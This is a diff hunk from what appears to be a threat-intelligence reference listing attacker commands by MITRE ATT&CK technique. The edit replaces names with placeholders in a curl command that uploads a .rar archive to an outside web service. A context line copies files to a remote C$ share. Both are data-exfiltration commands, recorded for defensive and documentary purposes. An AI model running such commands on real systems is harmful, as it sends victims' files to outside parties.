@@ -230,7 +230,7 @@ cmd.exe /C copy * \\<remote_ip>\C$\windows\destination\folder
 Exfiltration Over Web Service [[T1567](https://attack.mitre.org/techniques/T1567/)]
 
 ```
-cmd.exe /C curl -F "file=@$selfpath\filename.rar" --ssl-no-revoke https[:]//webservice.io
+cmd.exe /C curl -F "file=@$selfpath\<filename>.rar" --ssl-no-revoke https[:]//<web_service>.io
 ```
 <br>
 
